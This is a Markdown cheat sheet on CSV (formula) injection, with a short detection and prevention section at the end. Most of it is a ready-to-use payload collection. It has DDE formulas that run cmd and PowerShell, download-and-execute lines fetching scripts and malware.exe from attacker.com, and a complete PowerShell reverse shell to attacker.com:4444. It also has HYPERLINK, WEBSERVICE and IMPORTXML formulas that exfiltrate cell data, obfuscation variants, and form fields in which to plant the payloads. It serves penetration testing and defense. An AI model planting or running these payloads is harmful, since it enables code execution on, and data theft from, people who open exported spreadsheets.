# CSV Injection

## Description
CSV Injection (also known as Formula Injection) is a vulnerability where attackers inject malicious formulas into CSV files that execute when opened in spreadsheet applications like Microsoft Excel, LibreOffice Calc, or Google Sheets. This can lead to code execution, data exfiltration, or social engineering attacks.

## Formula Trigger Characters
Formulas in spreadsheets typically start with:
```
=  (equals)
+  (plus)
-  (minus/hyphen)
@  (at symbol)
|  (pipe)
\t (tab followed by =)
\r (carriage return followed by =)
```

## Attack Vectors

### 1. Dynamic Data Exchange (DDE) - Windows

#### Basic DDE Payloads
```csv
=cmd|'/C calc'!A0
=cmd|'/C notepad'!A0
=cmd|'/C powershell -e <base64_payload>'!A0
```

#### Command Execution
```csv
=cmd|'/C powershell IEX(wget http://attacker.com/shell.ps1)'!A0
=cmd|'/C powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
```

#### Using rundll32
```csv
=rundll32|'URL.dll,OpenURL calc.exe'!A
=rundll32|'URL.dll,OpenURL http://attacker.com/malware.exe'!A
```

#### MSEXCEL DDE
```csv
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc'!A0
```

### 2. Hyperlink Attacks

#### Basic Hyperlink
```csv
=HYPERLINK("http://attacker.com/steal?data="&A1&B1,"Click Here")
```

#### Data Exfiltration via Hyperlink
```csv
=HYPERLINK("http://attacker.com/log?user="&A2&"&pass="&B2,"Update Profile")
```

### 3. Remote File Inclusion

#### External Data Import
```csv
=IMPORTXML("http://attacker.com/xxe","//data")
=IMPORTHTML("http://attacker.com","table",1)
=IMPORTFEED("http://attacker.com/rss")
=IMPORTDATA("http://attacker.com/data.csv")
=IMPORTRANGE("http://attacker.com/spreadsheet","Sheet1!A1:D10")
```

### 4. Google Sheets Specific

#### IMPORTXML for XXE-like attacks
```csv
=IMPORTXML("http://attacker.com/log?data="&A1,"//content")
```

#### Blind Data Exfiltration
```csv
=IMPORTXML(CONCAT("http://attacker.com/steal?secret=",A1),"//a")
=IMPORTHTML(CONCAT("http://attacker.com/exfil?d=",ENCODEURL(A1:Z100)),"table",1)
```

### 5. LibreOffice Specific

#### Command Execution
```csv
=DDE("cmd";"/C calc";"a]a]a")
='file:///etc/passwd'#$passwd.A1
```

## Obfuscation Techniques

### Prefix Obfuscation
```csv
-=cmd|'/C calc'!A0
+=cmd|'/C calc'!A0
%0A=cmd|'/C calc'!A0
```

### Using Null Characters
```csv
=cmd|'/C calc'!A0%00
```

### Line Break Injection
```csv
"=cmd|'/C calc'!A0
=cmd|'/C calc'!A0"
```

### Command Chaining
```csv
=cmd|'/C calc & notepad'!A0
=cmd|'/C calc && whoami > output.txt'!A0
```

### Using Alternative Execution Methods
```csv
=CALL("Kernel32","WinExec","JCJ","calc.exe",0)
```

## Payload Collection

### Calculator PoC
```csv
=cmd|'/C calc'!A0
+cmd|'/C calc'!A0
-cmd|'/C calc'!A0
@SUM(cmd|'/C calc'!A0)
```

### Reverse Shell
```csv
=cmd|'/C powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\"attacker.com\",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'!A0
```

### Data Exfiltration
```csv
=HYPERLINK("http://attacker.com/?data="&ENCODEURL(A1:Z100),"Click to update")
=WEBSERVICE("http://attacker.com/?secret="&A1)
```

## Context-Specific Payloads

### User Registration Form
```
First Name: =cmd|'/C calc'!A0
Last Name: Smith
Email: test@test.com
```

### Comment/Feedback Form
```
Comment: Please review =cmd|'/C calc'!A0 this issue
```

### Export Functionality
Inject payloads into any field that will be exported to CSV/Excel.

## Testing Methodology

1. **Identify Export Functionality**
   - Look for "Export to CSV/Excel" features
   - Identify data that gets included in exports

2. **Inject Payloads**
   - Test each input field with formula prefixes
   - Try various obfuscation techniques

3. **Export and Test**
   - Export the data to CSV/Excel
   - Open in spreadsheet application
   - Check if formulas execute

4. **Document Impact**
   - Command execution possibility
   - Data exfiltration potential
   - Social engineering scenarios

## Detection
```bash
# Check for formula triggers in input
grep -E "^[=+\-@|]" input.csv

# Regex pattern for detection
^[\t\r]*[=+\-@|]
```

## Prevention

### Input Sanitization
```python
def sanitize_csv_field(field):
    if field and field[0] in ['=', '+', '-', '@', '\t', '\r', '|']:
        return "'" + field  # Prefix with single quote
    return field
```

### Output Encoding
```python
import csv

def safe_csv_write(data, filename):
    with open(filename, 'w', newline='') as f:
        writer = csv.writer(f, quoting=csv.QUOTE_ALL)
        for row in data:
            safe_row = [sanitize_csv_field(str(cell)) for cell in row]
            writer.writerow(safe_row)
```

### Application-Level Defenses
- Prefix all cells with single quote (')
- Use `@` prefix: `@=formula` displays as text
- Implement strict input validation
- Warn users when opening CSV files

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CSV%20Injection
- https://owasp.org/www-community/attacks/CSV_Injection
- https://blog.zsec.uk/csv-dangers-mitigations/
